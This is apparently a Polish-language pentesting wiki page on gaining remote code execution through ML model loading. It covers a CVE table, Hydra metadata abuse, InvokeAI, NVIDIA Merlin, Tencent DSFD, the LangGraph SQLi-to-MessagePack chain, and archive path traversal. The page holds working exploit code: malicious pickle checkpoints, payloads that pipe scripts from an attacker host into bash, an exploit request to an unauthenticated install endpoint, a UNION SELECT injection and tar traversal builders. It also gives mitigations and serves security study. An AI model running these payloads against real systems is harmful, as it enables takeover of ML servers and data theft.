# RCE modeli

{{#include ../banners/hacktricks-training.md}}

## Ładowanie modeli do RCE

Modele Machine Learning są zwykle udostępniane w różnych formatach, takich jak ONNX, TensorFlow, PyTorch itp. Deweloperzy mogą ładować te modele na swoich komputerach lub w systemach produkcyjnych, aby z nich korzystać. Modele zazwyczaj nie powinny zawierać złośliwego kodu, ale w niektórych przypadkach można ich użyć do wykonania dowolnego kodu w systemie — jako zamierzonej funkcji albo z powodu podatności w bibliotece służącej do ładowania modeli.

Poniższa tabela zawiera przykłady podatności z tej kategorii:

| **Framework / narzędzie**        | **Podatność (CVE, jeśli dostępne)**                                                    | **Wektor RCE**                                                                                                                           | **Odnośniki**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Niebezpieczna deserializacja w* `torch.load` **(CVE-2025-32434)**                                                              | Złośliwy pickle w checkpointcie modelu prowadzi do wykonania kodu (z pominięciem zabezpieczenia `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + pobranie złośliwego modelu prowadzą do wykonania kodu; RCE przez deserializację Java w management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Niebezpieczna deserializacja checkpointu przez `torch.load` **(CVE-2025-23298)**                                           | Niezaufany checkpoint uruchamia pickle reducer podczas `load_model_trainer_states_from_checkpoint` → wykonanie kodu w workerze ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + niebezpieczny hook rozszerzenia MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kontrolowany przez użytkownika klucz `filter` wstrzykuje składnię SQL/JSON-path, `UNION SELECT` tworzy fałszywy wiersz checkpointu, a następnie deserializacja `msgpack` importuje i wywołuje wybrany przez atakującego kod Python | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (niebezpieczny YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Ładowanie modelu z YAML używa `yaml.unsafe_load` (wykonanie kodu) <br> Ładowanie modelu z warstwą **Lambda** uruchamia dowolny kod Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (parsowanie TFLite)                                                                                          | Spreparowany model `.tflite` powoduje przepełnienie liczby całkowitej → uszkodzenie sterty (potencjalne RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Ładowanie modelu przez `joblib.load` wykonuje pickle z payloadem `__reduce__` atakującego                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (niebezpieczne `np.load`) *sporne*                                                                              | Domyślne ustawienie `numpy.load` dopuszczało tablice obiektów pickle — złośliwy plik `.npy/.npz` powoduje wykonanie kodu                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Ścieżka do zewnętrznych wag modelu ONNX może wyjść poza katalog (odczyt dowolnych plików) <br> Złośliwe archiwum tar z modelem ONNX może nadpisać dowolne pliki (prowadząc do RCE) | |
| ONNX Runtime (ryzyko projektowe)  | *(Brak CVE)* Niestandardowe operatory ONNX / przepływ sterowania                                                                                    | Model z niestandardowym operatorem wymaga załadowania natywnego kodu atakującego; złożone grafy modeli nadużywają logiki, aby wykonywać niezamierzone obliczenia   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Użycie API ładowania modeli z włączoną opcją `--model-control` umożliwia path traversal ze ścieżkami względnymi, aby zapisywać pliki (np. nadpisać `.bashrc` w celu uzyskania RCE)    | |
| **GGML (format GGUF)**      | **CVE-2024-25664 … 25668** (wiele przepełnień sterty)                                                                         | Wadliwy plik modelu GGUF powoduje przepełnienia bufora sterty w parserze, umożliwiając wykonanie dowolnego kodu w systemie ofiary                     | |
| **Keras (starsze formaty)**   | *(Brak nowego CVE)* Starszy model Keras H5                                                                                         | Złośliwy model HDF5 (`.h5`) z warstwą Lambda nadal wykonuje kod podczas ładowania (Keras `safe_mode` nie obejmuje starszego formatu — „downgrade attack”) | |
| **Inne** (ogólnie)        | *Błąd projektowy* – serializacja Pickle                                                                                         | Wiele narzędzi ML (np. formaty modeli oparte na pickle, Python `pickle.load`) wykona dowolny kod osadzony w plikach modeli, jeśli nie zostaną zastosowane zabezpieczenia | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Niezaufane metadane przekazywane do `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Kontrolowane przez atakującego metadane/konfiguracja modelu ustawiają `_target_` na dowolny obiekt wywoływalny (np. `builtins.exec`) → kod jest wykonywany podczas ładowania, nawet w przypadku „bezpiecznych” formatów (`.safetensors`, `.nemo`, repozytorium `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ponadto istnieją modele oparte na Python pickle, takie jak modele używane przez [PyTorch](https://github.com/pytorch/pytorch/security), których można użyć do wykonania dowolnego kodu w systemie, jeśli nie zostaną załadowane z `weights_only=True`. Dlatego każdy model oparty na pickle może być szczególnie podatny na tego typu ataki, nawet jeśli nie został wymieniony w powyższej tabeli.

### Metadane Hydra → RCE (działa również z safetensors)

`hydra.utils.instantiate()` importuje i wywołuje dowolny obiekt wskazany przez `_target_` w konfiguracji lub obiekcie metadanych. Gdy biblioteki takie jak Hugging Face Transformers przekazują do `instantiate()` **niezaufane metadane modelu**, atakujący może podać obiekt wywoływalny i argumenty, które zostaną natychmiast uruchomione podczas ładowania modelu (bez potrzeby użycia pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Przykład payloadu (działa w `model_config.yaml` pliku `.nemo`, repozytorium `config.json` lub w `__metadata__` wewnątrz `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Najważniejsze informacje:
- Uruchamiane przed inicjalizacją modelu w `restore_from/from_pretrained` w NeMo, w koderach HuggingFace uni2TS i w loaderach FlexTok.
- Listę blokowanych ciągów Hydry można obejść za pomocą alternatywnych ścieżek importu (np. `enum.bltns.eval`) lub nazw rozwiązywanych przez aplikację (np. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok analizuje również metadane zapisane jako ciągi za pomocą `ast.literal_eval`, co umożliwia DoS (nadmierne zużycie CPU/pamięci) przed wywołaniem Hydry.

### 🆕 RCE w InvokeAI za pomocą `torch.load` (CVE-2024-12029)

`InvokeAI` to popularny interfejs webowy open source dla Stable-Diffusion. Wersje **5.3.1 – 5.4.2** udostępniają endpoint REST `/api/v2/models/install`, który umożliwia użytkownikom pobieranie i ładowanie modeli z dowolnych URL-i.<sup>[[1]](#references)</sup>

Wewnętrznie endpoint ostatecznie wywołuje:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Gdy dostarczony plik jest **checkpointem PyTorch (`*.ckpt`)**, `torch.load` wykonuje **deserializację pickle**. Ponieważ zawartość pochodzi bezpośrednio z adresu URL kontrolowanego przez użytkownika, atakujący może umieścić w checkpointcie złośliwy obiekt z niestandardową metodą `__reduce__`; metoda ta jest wykonywana **podczas deserializacji**, co prowadzi do **zdalnego wykonania kodu (RCE)** na serwerze InvokeAI.

Podatności przypisano **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Omówienie exploita

1. Utwórz złośliwy checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Umieść `payload.ckpt` na kontrolowanym przez siebie serwerze HTTP (np. `http://ATTACKER/payload.ckpt`).
3. Wywołaj podatny endpoint (uwierzytelnianie nie jest wymagane):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Gdy InvokeAI pobiera plik, wywołuje `torch.load()` → gadget `os.system` uruchamia się, a atakujący uzyskuje możliwość wykonania kodu w kontekście procesu InvokeAI.

Gotowy exploit: moduł **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatyzuje cały przebieg.<sup>[[3]](#references)</sup>

#### Warunki

•  InvokeAI 5.3.1-5.4.2 (domyślna wartość flagi **scan** to **false**)
•  Dostęp atakującego do `/api/v2/models/install`
•  Proces ma uprawnienia do wykonywania poleceń powłoki

#### Środki zaradcze

* Uaktualnij do **InvokeAI ≥ 5.4.3** – poprawka domyślnie ustawia `scan=True` i skanuje pliki pod kątem złośliwego oprogramowania przed deserializacją.<sup>[[2]](#references)</sup>
* Podczas programowego ładowania checkpointów używaj `torch.load(file, weights_only=True)` lub nowego pomocnika [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Wymuś stosowanie list dozwolonych / podpisów dla źródeł modeli i uruchamiaj usługę z minimalnymi uprawnieniami.

> ⚠️ Pamiętaj, że każdy format oparty na Python pickle (w tym wiele plików `.pt`, `.pkl`, `.ckpt`, `.pth`) jest z natury niebezpieczny podczas deserializacji z niezaufanych źródeł.

---

Przykład doraźnego środka zaradczego, jeśli musisz nadal uruchamiać starsze wersje InvokeAI za reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE przez niebezpieczne `torch.load` (CVE-2025-23298)

Transformers4Rec od NVIDIA (część Merlin) udostępniał niebezpieczny loader checkpointów, który bezpośrednio wywoływał `torch.load()` dla ścieżek podanych przez użytkownika. Ponieważ `torch.load` korzysta z Pythonowego `pickle`, spreparowany przez atakującego checkpoint może wykonać dowolny kod za pośrednictwem reducera podczas deserializacji.<sup>[[5]](#references)</sup>

Podatna ścieżka (przed poprawką): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Dlaczego prowadzi to do RCE: W Pythonowym `pickle` obiekt może definiować reducer (`__reduce__`/`__setstate__`), który zwraca funkcję wywoływalną i argumenty. Funkcja ta jest wykonywana podczas odczytywania obiektu z pickle. Jeśli taki obiekt znajduje się w checkpoincie, jego kod zostanie uruchomiony, zanim zostaną użyte jakiekolwiek wagi.

Minimalny przykład złośliwego checkpointu:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Wektory dostarczenia i zasięg rażenia:
- Zainfekowane checkpoints/modele udostępniane za pośrednictwem repozytoriów, bucketów lub rejestrów artefaktów
- Zautomatyzowane pipeline’y wznawiania/wdrażania, które automatycznie wczytują checkpoints
- Wykonanie kodu odbywa się wewnątrz workerów treningowych/wnioskowania, często z podwyższonymi uprawnieniami (np. root w kontenerach)

Naprawa: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zastąpił bezpośrednie wywołanie `torch.load()` ograniczonym deserializatorem z listą dozwolonych typów, zaimplementowanym w `transformers4rec/utils/serialization.py`. Nowy loader weryfikuje typy/pola i uniemożliwia wywoływanie dowolnych funkcji podczas wczytywania.<sup>[[7]](#references)</sup>

Wskazówki dotyczące zabezpieczeń specyficzne dla checkpoints PyTorch:
- Nie wykonuj unpickle niezaufanych danych. Jeśli to możliwe, wybieraj formaty niewykonywalne, takie jak [Safetensors](https://huggingface.co/docs/safetensors/index) lub ONNX.
- Jeśli musisz używać serializacji PyTorch, ustaw `weights_only=True` (obsługiwane w nowszych wersjach PyTorch) lub użyj własnego unpicklera z listą dozwolonych typów, podobnego do poprawki Transformers4Rec.<sup>[[4]](#references)</sup>
- Wymuszaj weryfikację pochodzenia/podpisów modelu i stosuj sandbox podczas deserializacji (seccomp/AppArmor; użytkownik inny niż root; ograniczony system plików i brak wychodzącego ruchu sieciowego).
- Monitoruj nieoczekiwane procesy potomne uruchamiane przez usługi ML podczas wczytywania checkpointów; śledź użycie `torch.load()`/`pickle`.

POC oraz odnośniki do podatnej wersji i poprawki:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Podatny loader sprzed poprawki: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC złośliwego checkpointu: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader po poprawce: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Przykład – tworzenie złośliwego modelu PyTorch

- Utwórz model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Załaduj model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD udostępnia endpoint `resnet`, który deserializuje dane kontrolowane przez użytkownika. ZDI potwierdziło, że zdalny atakujący może nakłonić ofiarę do wczytania złośliwej strony/pliku, spowodować przesłanie spreparowanego serializowanego obiektu do tego endpointu i wywołać deserializację z uprawnieniami `root`, co prowadzi do pełnego przejęcia systemu.

Przebieg exploita przypomina typowe nadużycie pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Każdy gadget dostępny podczas deserializacji (konstruktory, `__setstate__`, callbacki frameworka itp.) można wykorzystać w ten sam sposób, niezależnie od tego, czy transportem było HTTP, WebSocket czy plik umieszczony w monitorowanym katalogu.



### LangGraph checkpointer SQLi → MessagePack RCE

Ten łańcuch ataku jest interesujący, ponieważ atakujący **nie musi przesyłać złośliwego pliku modelu**. Zamiast tego aplikacja udostępnia **API do utrwalania stanu agenta AI** (`get_state_history(..., filter=...)`), a dane wejściowe użytkownika trafiają do buildera zapytań checkpointera.

#### 1. Strukturalne SQLi w filtrach metadanych

Podatny wzorzec SQLite wyglądał tak:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Wartość jest wiązana później, ale `query_key` jest konkatenowany z **ciągiem ścieżki JSON**, więc `'` wewnątrz klucza słownika zamyka `'$.{query_key}'` i umożliwia wstrzyknięcie SQL. Ta sama zasada dotyczy **ścieżek JSON, identyfikatorów, operatorów, `LIMIT` i pól TTL**: placeholdery chronią tylko wartości, a nie składnię strukturalną zapytania.

#### 2. `UNION SELECT` może trafiać do dalszych sinków, a nie tylko służyć do kradzieży danych

Zapytanie zwraca `type` i serializowane bajty `checkpoint`, które są później wykorzystywane jako:

```python
self.serde.loads_typed((type, checkpoint))
```

Oznacza to, że SQLi w klauzuli `WHERE` może wstrzyknąć **fałszywy wiersz wyniku**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Jeśli późniejszy kod analizuje, deserializuje, zapisuje lub wykonuje dowolną wybraną kolumnę, przypisz te kolumny do ich sinków. W tym przypadku fałszywy wiersz zmienia SQLi w **deserializację kontrolowaną przez atakującego**.

#### 3. Niebezpieczne hooki rozszerzeń MessagePack są równoważne gadżetom kodu

Ścieżka `msgpack` w LangGraph używała niestandardowego hooka rozszerzeń, który rozpakowywał zagnieżdżoną krotkę i wykonywał:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Zatem obiekt rozszerzenia MessagePack kodujący coś równoważnego `("os", "system", "id > /tmp/pwned")` importuje `os`, wyszukuje `system` i uruchamia polecenie. Podczas audytu frameworków AI sprawdzaj **własne mechanizmy odtwarzania obiektów z MessagePack/JSON/pickle** pod kątem dynamicznego importowania, refleksji lub wywoływania dowolnych funkcji.

#### 4. Praktyczny schemat audytu frameworków agentowych

Sprawdź wszystkie dane kontrolowane przez użytkownika, które trafiają do:
- interfejsów API listujących historię stanu / pamięć / odtworzenia / punkty kontrolne
- konstruktorów filtrów strukturalnych generujących SQL lub fragmenty zapytań Redis
- własnych deserializatorów (`pickle`, `msgpack`, hooków obiektów `json`, konstruktorów YAML)
- ścieżek odzyskiwania, które ufają wierszom zwróconym przez warstwę trwałego przechowywania

Ten konkretny łańcuch podatności dotyczył samodzielnie hostowanych wdrożeń LangGraph używających checkpointerów **SQLite** lub **Redis**, gdy niezaufani użytkownicy mogli kontrolować `filter`. W ujawnieniu wskazano następujące poprawione wersje: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` oraz `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Modele a Path Traversal

Jak opisano w [**tym wpisie na blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), większość formatów modeli używanych przez różne frameworki AI bazuje na archiwach, zwykle `.zip`. Możliwe więc, że da się wykorzystać te formaty do przeprowadzenia ataków Path Traversal, umożliwiających odczyt dowolnych plików z systemu, w którym ładowany jest model.<sup>[[16]](#references)</sup>

Na przykład poniższy kod pozwala utworzyć model, który podczas ładowania utworzy plik w katalogu `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Można też za pomocą poniższego kodu utworzyć model, który po załadowaniu utworzy symlink do katalogu `/tmp`:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Dogłębna analiza: deserializacja Keras .keras i wyszukiwanie gadgetów

Szczegółowy przewodnik po wewnętrznym działaniu .keras, RCE przez warstwę Lambda, problemie dowolnego importu w wersjach ≤ 3.8 oraz wyszukiwaniu gadgetów w allowliście po poprawce znajdziesz tutaj:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog OffSec – „CVE-2024-12029 – deserializacja niezaufanych danych w InvokeAI”](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit z poprawką InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentacja modułu Metasploit Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – kwestie bezpieczeństwa związane z torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog ZDI – CVE-2025-23298: uzyskanie zdalnego wykonania kodu w NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Advisory ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit z poprawką Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Podatny loader sprzed poprawki (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC złośliwego checkpointu (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader po poprawce (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – zdalne wykonanie kodu z użyciem nowoczesnych formatów i bibliotek AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Dokumentacja Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit z block-listą Hydra (ostrzeżenie dotyczące RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – od SQLi do RCE: wykorzystanie checkpointera LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Wykorzystanie błędów Archive Slip do zdobycia cennych bounty w AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
